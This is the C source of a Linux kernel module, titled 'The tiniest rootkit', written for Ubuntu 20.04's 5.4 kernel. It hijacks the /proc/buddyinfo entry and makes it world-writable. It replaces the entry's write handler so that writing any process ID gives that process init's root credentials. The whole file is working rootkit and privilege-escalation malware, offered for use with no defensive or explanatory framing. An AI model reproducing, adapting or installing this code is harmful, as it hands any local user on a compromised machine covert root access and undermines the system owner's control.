#include <linux/module.h>   // included for all kernel modules
#include <linux/kernel.h>   // included for KERN_INFO
#include <linux/init.h>     // included for __init and __exit macros
#include <linux/proc_fs.h>
#include <linux/refcount.h>

/* Ubuntu 20.04 LTS (Linux 5.4.0-54-generic) */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("u2i");
MODULE_DESCRIPTION("The tiniest rootkit");

struct proc_dir_entry {
    atomic_t in_use;
    refcount_t refcnt;
    struct list_head pde_openers;
    spinlock_t pde_unload_lock;
    struct completion *pde_unload_completion;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    const struct dentry_operations *proc_dops;
    union {
        const struct seq_operations *seq_ops;
        int (*single_show) (struct seq_file *, void *);
    };
    proc_write_t write;
    void *data;
    unsigned int state_size;
    unsigned int low_ino;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    char *name;
    umode_t mode;
    u8 namelen;
    char inline_name[];
} __randomize_layout;

static struct file_operations handler_fops;
const struct file_operations *handler_original = 0;
struct proc_dir_entry *handler, *root;

//returns the task_struct associated with pid
struct task_struct *get_task_struct_by_pid(unsigned pid)
{
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;
    if (!proc_pid)
        return 0;
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

static ssize_t make_pid_root (
    struct file *filp,
    const char __user *data,
    size_t sz,
    loff_t *l)
{
    char *dummy;
    unsigned pid = (int) simple_strtol(data, &dummy, 10);
    struct task_struct *task = get_task_struct_by_pid(pid);
    struct task_struct *init_task = get_task_struct_by_pid(1);
    printk("YOU HAVE BEEN HACKED: Making PID %d root\n", pid);
    if (!task || !init_task)
        return 1;
    task->cred = init_task->cred;

    return 1;
}

/*
 * Infects /proc/buddyinfo with a device handler that sets
 */

void install_handler(struct proc_dir_entry *root)
{
    struct rb_node *entry = rb_first(&root->subdir);
    struct proc_dir_entry *ptr;

    while (entry) {
        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, "buddyinfo") == 0) {
            ptr = rb_entry(entry, struct proc_dir_entry, subdir_node);
            break;
        }
        entry = rb_next(entry);
    }
    if (ptr) {
        handler = ptr;
        ptr->mode |= S_IWUGO;
        handler_original = (struct file_operations *) ptr->proc_fops;
        // create new handler
        handler_fops = *ptr->proc_fops;
        handler_fops.write = make_pid_root;
        ptr->proc_fops = &handler_fops;
    }
}

static int __init module_init_proc(void)
{
    static const struct file_operations fileops_struct;
    struct proc_dir_entry *new_proc;
    // dummy to get proc_dir_entry of /proc
    new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
    root = new_proc->parent;

    // install the handler to wait for orders...
    install_handler(root);

    // it's no longer required.
    remove_proc_entry("dummy", 0);
    return 0;
}

static int __init rootkit_init(void)
{
    module_init_proc();
    printk(KERN_INFO "starting kernel module!\n");
    return 0;   // Non-zero return means that the module couldn't be loaded.
}

static void __exit rootkit_cleanup(void)
{
    handler->proc_fops = handler_original;
    printk(KERN_INFO "Cleaning up modules.\n");
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);
